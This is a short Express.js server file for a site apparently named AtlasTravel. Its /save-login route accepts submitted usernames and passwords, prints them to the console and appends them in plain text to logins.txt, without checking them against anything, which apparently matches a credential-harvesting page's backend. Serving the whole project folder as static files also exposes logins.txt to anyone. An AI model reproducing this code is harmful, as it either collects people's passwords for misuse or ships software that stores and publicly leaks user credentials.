// Import necessary modules
const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = 3000;

// Middleware to parse URL-encoded bodies (for login form submission)
app.use(express.urlencoded({ extended: true }));

// Middleware to serve static files from the AtlasTravel folder
app.use(express.static(path.join(__dirname)));

// Route to serve the main HTML file (index.html)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Login route to save login details to logins.txt
app.post('/save-login', (req, res) => {
    const { username, password } = req.body;

    // Log the form data for debugging
    console.log('Received username:', username);
    console.log('Received password:', password);

    // Check if username and password are available
    if (!username || !password) {
        return res.status(400).send('Username or password is missing.');
    }

    // Create log data and append it to logins.txt
    const logData = `Username: ${username}, Password: ${password}\n`;

    // Append login data to logins.txt
    fs.appendFile('logins.txt', logData, (err) => {
        if (err) {
            res.status(500).send('Error saving login data');
        } else {
            res.send('Login data saved successfully');
        }
    });
});

// Start the server on port 3000
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
